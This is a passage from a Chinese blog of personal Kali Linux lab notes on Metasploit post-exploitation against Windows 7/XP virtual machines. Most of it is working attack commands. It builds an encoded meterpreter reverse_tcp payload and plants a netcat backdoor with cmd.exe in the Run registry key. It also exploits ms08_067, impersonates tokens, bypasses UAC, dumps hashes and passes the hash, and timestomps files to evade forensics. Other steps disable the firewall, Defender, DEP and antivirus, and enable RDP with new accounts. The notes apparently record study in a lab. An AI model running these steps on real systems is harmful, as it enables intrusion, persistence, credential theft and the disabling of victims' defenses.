<li><strong><code>🔺命令：run</code></strong> </li>
</ul>
</li>
</ul>
<h4 id="4-搜索文件（meterpreter）"><a href="#4-搜索文件（meterpreter）" class="headerlink" title="4. 搜索文件（meterpreter）"></a>4. 搜索文件（meterpreter）</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：search -f *.ini</code></strong>  </li>
<li><strong><code>🔺命令：search -d c:\\documents\ and\ settings\\administrator\\desktop\\ -f *.docx</code></strong> </li>
</ul>
</li>
</ul>
<h4 id="5-John-the-Ripper破解弱口令"><a href="#5-John-the-Ripper破解弱口令" class="headerlink" title="5. John the Ripper破解弱口令"></a>5. John the Ripper破解弱口令</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：use post/windows/gather/hashdump</code></strong>   #system权限的meterpreter<ul>
<li><strong><code>🔺命令：set session sessionID</code></strong> </li>
<li><strong><code>🔺命令：run</code></strong>   #结果保存在/tmp目录下</li>
</ul>
</li>
<li><strong><code>🔺命令：use auxiliary/analyze/jtr_crack_fast</code></strong> <ul>
<li><strong><code>🔺命令：run</code></strong> </li>
</ul>
</li>
<li>▲ 2020.03.03 暂无jtr_crack_fast此模块</li>
</ul>
</li>
</ul>
<h4 id="6-MAC时间"><a href="#6-MAC时间" class="headerlink" title="6. MAC时间"></a>6. MAC时间</h4><ul>
<li>文件系统访问会留下痕迹，电子取证重点关注</li>
<li>渗透测试和攻击者往往希望销毁文件系统访问痕迹</li>
<li>最好的避免被电子取证发现的方法：不要碰文件系统<ul>
<li>Meterpreter的先天优势所在（完全基于内存）</li>
</ul>
</li>
<li>MAC时间（Modified / Accessed / Created）<ul>
<li><strong><code>🔺命令：echo aaaa &gt; 1.txt</code></strong> </li>
<li><strong><code>🔺命令：ls -l --time=atime/ctime 1.txt</code></strong> （默认的时间为modified time）</li>
<li>列出文件的MAC时间：<strong><code>🔺命令：stat 1.txt</code></strong> </li>
<li>修改文件的MAC时间<ul>
<li><strong><code>🔺命令：touch -d &quot;2 days ago&quot; 1.txt</code></strong> （Created时间）</li>
<li><strong><code>🔺命令：touch -t 1501010101 1.txt</code></strong> （Modified和Accessed时间）</li>
</ul>
</li>
</ul>
</li>
<li>MACE：MFT entry<ul>
<li>MFT：NTFS文件系统的主文件分配表Master File Table</li>
<li>通常1024字节或2个硬盘扇区，其中存放多项entry信息</li>
<li>包含文件大量信息（大小、名称、目录位置、磁盘位置、创建时间）</li>
<li>更多信息可研究文件系统取证分析技术</li>
<li>▲ 可通过修改文件名称来查看E的变化</li>
</ul>
</li>
</ul>
<h4 id="7-Timestomp（meterpreter）"><a href="#7-Timestomp（meterpreter）" class="headerlink" title="7. Timestomp（meterpreter）"></a>7. Timestomp（meterpreter）</h4><ul>
<li>Kali<ul>
<li>timestomp参数<ul>
<li>-v：显示详细MAC时间</li>
<li>-f：指定模板文件时间作为复制</li>
<li>-b -r（递归擦除）：擦除MAC时间信息，目前此参数功能失效</li>
<li>-a/-c/-m/-e：修改MACE的A/C/M/E参数的时间</li>
<li>-z：修改MACE的所有参数的时间</li>
</ul>
</li>
<li>▲ EnCase工具在电子取证中很出名</li>
<li><strong><code>🔺命令：timestomp -v 1.txt</code></strong>  </li>
<li><strong><code>🔺命令：timestomp -f c:\\autoexec.bat 1.txt</code></strong> </li>
<li><strong><code>🔺命令：timestomp -z &quot;MM/DD/YYYY HH24:MI:SS&quot;  2.txt</code></strong> </li>
</ul>
</li>
</ul>
<h4 id="8-用注册表添加NC后门服务、打开防火墙端口（meterpreter）"><a href="#8-用注册表添加NC后门服务、打开防火墙端口（meterpreter）" class="headerlink" title="8. 用注册表添加NC后门服务、打开防火墙端口（meterpreter）"></a>8. 用注册表添加NC后门服务、打开防火墙端口（meterpreter）</h4><ul>
<li>注册表保存着windows几乎全部配置参数<ul>
<li>如果修改不当，可直接造成系统崩溃</li>
<li>修改前完整备份注册表</li>
<li>某些注册表的修改是不可逆的</li>
</ul>
</li>
<li>常见用途<ul>
<li>修改、增加启动项</li>
<li>窃取存储于注册表中的机密信息</li>
<li>绕过文件型病毒查杀</li>
</ul>
</li>
<li>Kali<ul>
<li><strong><code>🔺命令：upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32</code></strong> </li>
<li>查看Window 7系统启动程序：<strong><code>🔺命令：reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run</code></strong>  </li>
<li>在查看的主键在新建监制：<strong><code>🔺命令：reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d &#39;C:\windows\system32\nc.exe -Ldp 444 -e cmd.exe&#39;</code></strong> </li>
<li><strong><code>🔺命令：reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v nc</code></strong> </li>
<li><strong><code>🔺命令：execute -f cmd -i -H</code></strong>  </li>
<li><strong><code>🔺命令：netsh firewall show opmode</code></strong>  </li>
<li><strong><code>🔺命令：netsh firewall add portopening TCP 4444 &quot;test&quot; ENABLE ALL</code></strong>  </li>
<li><strong><code>🔺命令：shutdown -r -t 0</code></strong>  </li>
</ul>
</li>
<li>Window 7<ul>
<li><strong><code>🔺命令：netstat -nao</code></strong> 查看是否开启了4444端口</li>
<li><strong><code>🔺命令：tasklist</code></strong> 查看进程的PID</li>
</ul>
</li>
<li>Kali<ul>
<li><strong><code>🔺命令：nc Kali的IP 4444</code></strong> </li>
</ul>
</li>
<li>其他注册表项<ul>
<li><a href="https://support.accessdata.com/hc/en-us/articles/204448155-RegistryQuick-Find-Chart" target="_blank" rel="noopener">https://support.accessdata.com/hc/en-us/articles/204448155-RegistryQuick-Find-Chart</a></li>
</ul>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E5%85%AB)%EF%BC%9AMSF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--Token%E6%8F%90%E6%9D%83/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/03/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E5%85%AB)%EF%BC%9AMSF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--Token%E6%8F%90%E6%9D%83/" itemprop="url">Kali Linux笔记(一百零八)：MSF后渗透测试--Token提权</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-03T15:31:17+08:00">
                2020-03-03
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  785 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  3 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-Msf后渗透测试阶段"><a href="#1-Msf后渗透测试阶段" class="headerlink" title="1. Msf后渗透测试阶段"></a>1. Msf后渗透测试阶段</h4><ul>
<li>已经获得目标系统控制权后扩大战果<ul>
<li>提权</li>
<li>信息收集</li>
<li>渗透内网</li>
<li>永久后门</li>
</ul>
</li>
<li>实验环境<ul>
<li>Window 7<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li>关闭防火墙</li>
</ul>
</li>
<li>Kali<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="2-基于已有session扩大战果"><a href="#2-基于已有session扩大战果" class="headerlink" title="2. 基于已有session扩大战果"></a>2. 基于已有session扩大战果</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=Kali的IP LPORT=4444 -b &quot;\x00&quot; -e x86/shikata_ga_nai -i 7 -f exe -o 1.exe</code></strong></li>
<li><strong><code>🔺命令：service apache2 start</code></strong></li>
<li><strong><code>🔺命令：cp 1.exe /var/www/html</code></strong></li>
<li><strong><code>🔺命令：msfconsole -q</code></strong></li>
<li><strong><code>🔺命令：use exploit/multi/handler</code></strong><ul>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong></li>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>Window 7<ul>
<li>浏览器访问<a href="http://Kali的IP，下载保存1.exe" target="_blank" rel="noopener">http://Kali的IP，下载保存1.exe</a></li>
<li>双击打开1.exe</li>
</ul>
</li>
<li>Kali<ul>
<li>查看是否拿到shell</li>
<li><strong><code>🔺命令：session -l</code></strong></li>
</ul>
</li>
</ul>
<h4 id="3-获取system账号权限"><a href="#3-获取system账号权限" class="headerlink" title="3. 获取system账号权限"></a>3. 获取system账号权限</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：load priv</code></strong> </li>
<li><strong><code>🔺命令：getsystem</code></strong> <ul>
<li>priv_elevate_getsystem: Operation failed: Access is denied. </li>
<li>priv_elevate_getsystem: Operation failed: The enviroment is incorrect.</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="4-Token提权"><a href="#4-Token提权" class="headerlink" title="4. Token提权"></a>4. Token提权</h4><ul>
<li>Tokens<ul>
<li>用户每次登陆，账号绑定临时的Token</li>
<li>访问资源时提价Token进行身份验证，类似于WEB Cookie</li>
<li>Delegate Token：交互登陆会话（windowd的登陆界面、远程桌面）</li>
<li>Impersonate Token：非交互登陆会话（SMB协议访问文件共享目录）</li>
<li>Delegate Token：账号注销后变为Impersonate Token，权限依然有效<ul>
<li>▲ 域管理员登陆注销后，依然依存这Token</li>
</ul>
</li>
</ul>
</li>
<li>Incognito<ul>
<li>独立功能的软件，被MSF集成在meterpreter中</li>
<li>无需密码破解或获取密码HASH，窃取Token将自己伪装成其他用户</li>
<li>尤其适用于域环境下提权渗透多操作系统</li>
</ul>
</li>
<li>搭建域环境<ul>
<li>▲ 2020.03.03 因搭建实验环境需要重启启动机器+硬盘空间所剩不足+XP和2003的有效期已经过了，故这次实验先暂且放一放</li>
<li>Window Server 2003<ul>
<li>配置静态IP地址，DNS服务器指向自己</li>
<li>运行域程序的安装：dcpromo（安装过程需要光盘）</li>
<li>DNS全名：lab.com</li>
<li>重新启动服务器</li>
<li>分配域账号（无本地用户） → dsa.msc → lab.com → Users → 右键 → 新建普通用户u1 → 设置账户密码（域的密码要复杂，需包含大写字母，小写字母，数字，特殊字符其中三种，且长度长于7个字符）</li>
</ul>
</li>
<li>Window XP SP3<ul>
<li>关闭防火墙 → 配置静态IP地址（DNS指向域控制器）</li>
<li>我的电脑 → 右键 → 属性 → 高级系统设置 → 计算机名 → 更改 → 指定域（lab.com）</li>
<li>重新启动机器</li>
<li>用域账号Administrator登陆，关闭防火墙</li>
<li>再用域账号u1登陆</li>
</ul>
</li>
<li>Window Server 2003<ul>
<li>Win+R → \Window XP SP3的IP\c$ → 进行操作</li>
</ul>
</li>
<li>Kali<ul>
<li><strong><code>🔺命令：use exploit/windows/smb/ms08_067_netapi</code></strong><ul>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
</ul>
</li>
<li><strong><code>🔺命令：set RHOST Window XP SP3的IP</code></strong></li>
<li><strong><code>🔺命令：set target 34</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
<li><strong><code>🔺命令：getuid</code></strong></li>
<li><strong><code>🔺命令：load incognito</code></strong><ul>
<li>使用伪装Token需要提权为本地SYSTEM权限</li>
<li>查看组的Token：<strong><code>🔺命令：list_tokens -u</code></strong></li>
<li>伪装Token：<strong><code>🔺命令：impersonate_token lab\\administrator</code></strong></li>
</ul>
</li>
<li><strong><code>🔺命令：getuid</code></strong></li>
<li><strong><code>🔺命令：execute -f cmd.exe -i -t</code></strong> # -t：使用当前假冒token执行程序</li>
<li><strong><code>🔺命令：shell</code></strong><ul>
<li><strong><code>🔺命令：net user a a /add</code></strong>（增加账号尝试）</li>
</ul>
</li>
</ul>
</li>
<li>▲ 本地普通权限用户需先本地提权<ul>
<li><strong><code>🔺命令：use exploit/windows/local/ms10_015_kitrap0d</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E4%B8%83)%EF%BC%9AMSF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--UAC%E6%8F%90%E6%9D%83/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/03/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E4%B8%83)%EF%BC%9AMSF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--UAC%E6%8F%90%E6%9D%83/" itemprop="url">Kali Linux笔记(一百零七)：MSF后渗透测试--UAC提权</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-03T15:28:28+08:00">
                2020-03-03
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  1.1k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  5 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-Msf后渗透测试阶段"><a href="#1-Msf后渗透测试阶段" class="headerlink" title="1. Msf后渗透测试阶段"></a>1. Msf后渗透测试阶段</h4><ul>
<li>已经获得目标系统控制权后扩大战果<ul>
<li>提权</li>
<li>信息收集</li>
<li>渗透内网</li>
<li>永久后门</li>
</ul>
</li>
<li>实验环境<ul>
<li>Window 7<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li>关闭防火墙</li>
</ul>
</li>
<li>Kali<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="2-基于已有session扩大战果"><a href="#2-基于已有session扩大战果" class="headerlink" title="2. 基于已有session扩大战果"></a>2. 基于已有session扩大战果</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=Kali的IP LPORT=4444 -b &quot;\x00&quot; -e x86/shikata_ga_nai -i 7 -f exe -o 1.exe</code></strong></li>
<li><strong><code>🔺命令：service apache2 start</code></strong></li>
<li><strong><code>🔺命令：cp 1.exe /var/www/html</code></strong></li>
<li><strong><code>🔺命令：msfconsole -q</code></strong></li>
<li><strong><code>🔺命令：use exploit/multi/handler</code></strong><ul>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong></li>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>Window 7<ul>
<li>浏览器访问<a href="http://Kali的IP，下载保存1.exe" target="_blank" rel="noopener">http://Kali的IP，下载保存1.exe</a></li>
<li>双击打开1.exe</li>
</ul>
</li>
<li>Kali<ul>
<li>查看是否拿到shell</li>
<li><strong><code>🔺命令：session -l</code></strong></li>
</ul>
</li>
</ul>
<h4 id="3-获取system账号权限"><a href="#3-获取system账号权限" class="headerlink" title="3. 获取system账号权限"></a>3. 获取system账号权限</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：load priv</code></strong> </li>
<li><strong><code>🔺命令：getsystem</code></strong> <ul>
<li>priv_elevate_getsystem: Operation failed: Access is denied. </li>
<li>priv_elevate_getsystem: Operation failed: The enviroment is incorrect.</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="4-绕过UAC限制-1"><a href="#4-绕过UAC限制-1" class="headerlink" title="4. 绕过UAC限制-1"></a>4. 绕过UAC限制-1</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：use exploit/windows/local/ask</code></strong><ul>
<li><strong><code>🔺命令：set session 1</code></strong></li>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
</ul>
</li>
<li><strong><code>🔺命令：set filename 欺骗性的文件名.exe</code></strong><ul>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Window 7<ul>
<li>UAC → 是</li>
</ul>
</li>
<li>Kali<ul>
<li>查看是否拿到更高权限</li>
<li><strong><code>🔺命令：session -i 2</code></strong></li>
<li><strong><code>🔺命令：getuid</code></strong></li>
<li><strong><code>🔺命令：load priv</code></strong></li>
<li><strong><code>🔺命令：getsystem</code></strong></li>
<li><strong><code>🔺命令：getuid</code></strong>（查看是否为SYSTEM权限）</li>
</ul>
</li>
</ul>
<h4 id="5-绕过UAC限制-2"><a href="#5-绕过UAC限制-2" class="headerlink" title="5. 绕过UAC限制-2"></a>5. 绕过UAC限制-2</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：use exploit/windows/local/bypassuac</code></strong>（EXE执行程序）<ul>
<li><strong><code>🔺命令：set session 1</code></strong></li>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Window 7<ul>
<li>查看是否弹窗</li>
</ul>
</li>
<li>Kali<ul>
<li><strong><code>🔺命令：getuid</code></strong></li>
<li><strong><code>🔺命令：load priv</code></strong></li>
<li><strong><code>🔺命令：getsystem</code></strong></li>
<li><strong><code>🔺命令：getuid</code></strong>（查看是否为SYSTEM权限）</li>
</ul>
</li>
<li>▲ 2020.03.02 对于非admins group，无法提升权限</li>
</ul>
<h4 id="6-绕过UAC限制-3"><a href="#6-绕过UAC限制-3" class="headerlink" title="6. 绕过UAC限制-3"></a>6. 绕过UAC限制-3</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：use exploit/windows/local/bypassuac_injection</code></strong>（注入DLL库）<ul>
<li><strong><code>🔺命令：set session 1</code></strong></li>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Window 7<ul>
<li>查看是否弹窗</li>
</ul>
</li>
<li>Kali<ul>
<li><strong><code>🔺命令：getuid</code></strong></li>
<li><strong><code>🔺命令：load priv</code></strong></li>
<li><strong><code>🔺命令：getsystem</code></strong></li>
<li><strong><code>🔺命令：getuid</code></strong>（查看是否为SYSTEM权限）</li>
</ul>
</li>
<li>▲ 2020.03.02 对于非admins group，无法提升权限</li>
</ul>
<h4 id="7-UAC利用"><a href="#7-UAC利用" class="headerlink" title="7. UAC利用"></a>7. UAC利用</h4><ul>
<li>▲ 需要提前关闭UAC</li>
<li>Kali<ul>
<li><strong><code>🔺命令：use exploit/windows/local/bypassuac_injection</code></strong>（注入DLL库）<ul>
<li><strong><code>🔺命令：set session 1</code></strong></li>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
<li><strong><code>🔺命令：load priv</code></strong></li>
<li><strong><code>🔺命令：getsystem</code></strong></li>
<li><strong><code>🔺命令：getuid</code></strong></li>
<li><strong><code>🔺命令：hashdump</code></strong><ul>
<li>▲ 2020.03.03 Operation failed：The parameter is incorrect</li>
<li>▲ 2020.03.03 run post/windows/gather/hashdump调用不一定能行</li>
<li>▲ 2020.03.03 在非Meterpreter下，<strong><code>🔺命令：use post/windows/gather/hashdump</code></strong>，可在非SYSTEM权限下成功获取到哈希值</li>
</ul>
</li>
<li><strong><code>🔺命令：shell</code></strong>（添加注册表键值，关闭UAC验证）<ul>
<li><strong><code>🔺命令：cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f</code></strong> </li>
<li><strong><code>🔺命令：cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f</code></strong> </li>
<li><strong><code>🔺命令：cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f</code></strong></li>
<li><strong><code>🔺命令：cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f</code></strong><ul>
<li><strong><code>🔺命令：shutdown -r -t 0</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Window 7<ul>
<li>确认UAC功能是否关闭</li>
<li>▲ 查看UAC方法（Win7）：开始 → 控制面板 → 查看方式：大图标 → 操作中心 → 更改用户账户控制设置</li>
</ul>
</li>
<li>Kali<ul>
<li>Psexec模块之 Passthehash<ul>
<li><strong><code>🔺命令：use exploit/windows/smb/psexec</code></strong> <ul>
<li><strong><code>🔺命令：set rhost Window 7的IP</code></strong></li>
<li><strong><code>🔺命令：set smbuser w7</code></strong></li>
<li><strong><code>🔺命令：set smbpass 取得的hash值密文</code></strong></li>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
<li>hash值root:toor(aad3b435b51404eeaad3b435b51404ee:3bdfee3835ee03d4283d4569ec1263e4:::)</li>
</ul>
</li>
</ul>
</li>
<li>▲ 2020.03.03 该模块包报错，UnexpectedStatusCode STATUS_USER_SESSION_DELETED</li>
</ul>
</li>
<li>Window 7<ul>
<li>开启防火墙</li>
</ul>
</li>
<li>Kali<ul>
<li>关闭防火墙<ul>
<li>需要管理员或system权限</li>
<li><strong><code>🔺命令：shell</code></strong><ul>
<li><strong><code>🔺命令：netsh advfirewall set allprofiles state off</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Window 7<ul>
<li>查看防火墙是否被关闭</li>
<li>Win+R → services.msc → 查看Windefend是否开启状态</li>
</ul>
</li>
<li>Kali<ul>
<li>关闭Windefend<ul>
<li><strong><code>🔺命令：shell</code></strong><ul>
<li><strong><code>🔺命令：net stop windefend</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Window 7<ul>
<li>查看Windefend是否被关闭</li>
<li>关闭远程桌面服务</li>
</ul>
</li>
<li>Kali<ul>
<li>Bitclock磁盘加密<ul>
<li><strong><code>🔺命令：shell</code></strong><ul>
<li>关闭Bitclock加密：<strong><code>🔺命令：manage-bde -off C:</code></strong> </li>
<li>查看Bitclokc加密状态：<strong><code>🔺命令：manage-bde -status C:</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>关闭DEP<ul>
<li>**`🔺命令：shell<ul>
<li><strong><code>🔺命令：bcdedit.exe /set {current} nx AlwaysOff</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>杀死防病毒软件<ul>
<li><strong><code>🔺命令：run killav</code></strong> </li>
<li><strong><code>🔺命令：run post/windows/manage/killav</code></strong></li>
</ul>
</li>
<li>开启远程桌面服务<ul>
<li><strong><code>🔺命令：run post/windows/manage/enable_rdp</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>Window 7<ul>
<li>查看远程桌面是否被开启</li>
</ul>
</li>
<li>Kali<ul>
<li>关闭远程桌面服务<ul>
<li><strong><code>🔺命令：run multi_console_command -rc /root/.msf4/logs/scripts/getgui/ clean_up__20160824.1855.rc</code></strong> </li>
</ul>
</li>
</ul>
</li>
<li>Window 7<ul>
<li>查看远程桌面是否被关闭</li>
</ul>
</li>
<li>Kali<ul>
<li>开启远程桌面GUI服务：<strong><code>🔺命令：run getgui –e</code></strong></li>
<li>添加用户账号：<strong><code>🔺命令：run getgui -u yuanfh -p pass</code></strong></li>
<li>查看远程桌面<ul>
<li>截图：<strong><code>🔺命令：screenshot</code></strong></li>
<li><strong><code>🔺命令：use/load espia</code></strong> <ul>
<li><strong><code>🔺命令：help</code></strong></li>
<li><strong><code>🔺命令：screengrab</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E5%85%AD)%EF%BC%9AMSF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/03/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E5%85%AD)%EF%BC%9AMSF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83/" itemprop="url">Kali Linux笔记(一百零六)：MSF后渗透测试--漏洞提权</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
